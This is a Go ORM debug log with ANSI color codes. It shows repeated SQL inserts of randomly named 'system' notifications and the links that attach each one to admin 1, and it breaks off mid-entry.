[0m[33m[21.807ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.035','2025-06-09 14:08:00.035',NULL,'zzFYYwZsqvdeWHlIoChc','system','2025-06-09 14:08:00.035',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.696ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 178 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.748ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.06','2025-06-09 14:08:00.06',NULL,1,178) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.367ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.067','2025-06-09 14:08:00.067',NULL,'wsVeHajLzzOLWsUPxkCb','system','2025-06-09 14:08:00.067',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.590ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.030ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 179 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.921ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.083','2025-06-09 14:08:00.083',NULL,1,179) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.769ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.091','2025-06-09 14:08:00.091',NULL,'fIzDUrioYpAKyKVpBPuY','system','2025-06-09 14:08:00.091',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 180 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[38.351ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.102','2025-06-09 14:08:00.102',NULL,1,180) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.485ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.139','2025-06-09 14:08:00.139',NULL,'XCDvqGWFRUAKNGjOSzdI','system','2025-06-09 14:08:00.139',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.459ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 181 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.015ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.147','2025-06-09 14:08:00.147',NULL,1,181) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.982ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.155','2025-06-09 14:08:00.155',NULL,'lpVWleiUOkqLXPrxiSvU','system','2025-06-09 14:08:00.155',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.446ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 182 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[6.873ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.165','2025-06-09 14:08:00.165',NULL,1,182) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.314ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.171','2025-06-09 14:08:00.171',NULL,'PhRDgYGtLtFvDGQbWVTr','system','2025-06-09 14:08:00.171',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.437ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[5.043ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 183 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.969ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.184','2025-06-09 14:08:00.184',NULL,1,183) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.791ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.193','2025-06-09 14:08:00.193',NULL,'XpYLAMvlYCNBUFYZyySg','system','2025-06-09 14:08:00.191',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.433ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.516ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 184 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.539ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.2','2025-06-09 14:08:00.2',NULL,1,184) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.461ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.209','2025-06-09 14:08:00.209',NULL,'NGgzKFrpHEwuaDjQFmwE','system','2025-06-09 14:08:00.209',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.461ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 185 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.017ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.218','2025-06-09 14:08:00.218',NULL,1,185) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.360ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.224','2025-06-09 14:08:00.224',NULL,'uMTMqpRVIgiLrfuFfVMN','system','2025-06-09 14:08:00.224',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.416ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 186 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.126ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.233','2025-06-09 14:08:00.233',NULL,1,186) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.727ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.239','2025-06-09 14:08:00.239',NULL,'nGBkuEzoaszLJNPzhPhS','system','2025-06-09 14:08:00.239',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.365ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.595ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 187 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.152ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.246','2025-06-09 14:08:00.246',NULL,1,187) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.597ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.252','2025-06-09 14:08:00.252',NULL,'ucVKKPKyZluwTtjWhSkk','system','2025-06-09 14:08:00.252',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.559ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.606ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 188 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[13.486ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.263','2025-06-09 14:08:00.263',NULL,1,188) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.362ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.277','2025-06-09 14:08:00.277',NULL,'VlAegizXZljuaOnYdeyX','system','2025-06-09 14:08:00.277',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.513ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.553ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 189 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.105ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.284','2025-06-09 14:08:00.284',NULL,1,189) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.166ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.29','2025-06-09 14:08:00.29',NULL,'nInQCHNXkLEBOKfyuUsi','system','2025-06-09 14:08:00.29',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.554ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 190 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.513ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.3','2025-06-09 14:08:00.3',NULL,1,190) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.646ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.308','2025-06-09 14:08:00.308',NULL,'QIifYLdOHlTpbypQzNyt','system','2025-06-09 14:08:00.308',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.444ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.540ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 191 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.998ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.316','2025-06-09 14:08:00.316',NULL,1,191) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.069ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.324','2025-06-09 14:08:00.324',NULL,'zjXwEFeYaGEcRBdqFdgr','system','2025-06-09 14:08:00.324',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 192 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[20.222ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.331','2025-06-09 14:08:00.331',NULL,1,192) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.707ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.351','2025-06-09 14:08:00.351',NULL,'dqwaFczqJWpkmNIPwLTN','system','2025-06-09 14:08:00.351',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.428ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 193 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.495ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.36','2025-06-09 14:08:00.36',NULL,1,193) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.639ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.367','2025-06-09 14:08:00.367',NULL,'cipslLVeYbFPQXgDvTBz','system','2025-06-09 14:08:00.367',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 194 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.767ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.379','2025-06-09 14:08:00.379',NULL,1,194) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.919ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.386','2025-06-09 14:08:00.386',NULL,'NpTKWfJSXQYzBsuwJmDE','system','2025-06-09 14:08:00.386',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.641ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.754ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 195 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[16.333ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.393','2025-06-09 14:08:00.393',NULL,1,195) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.701ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.408','2025-06-09 14:08:00.408',NULL,'MhxtFTlADmAugbpzctjz','system','2025-06-09 14:08:00.408',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.479ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 196 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[13.980ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.42','2025-06-09 14:08:00.42',NULL,1,196) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.763ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.432','2025-06-09 14:08:00.432',NULL,'XFoilGTUQYhZBqmrVvqj','system','2025-06-09 14:08:00.432',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.438ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 197 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
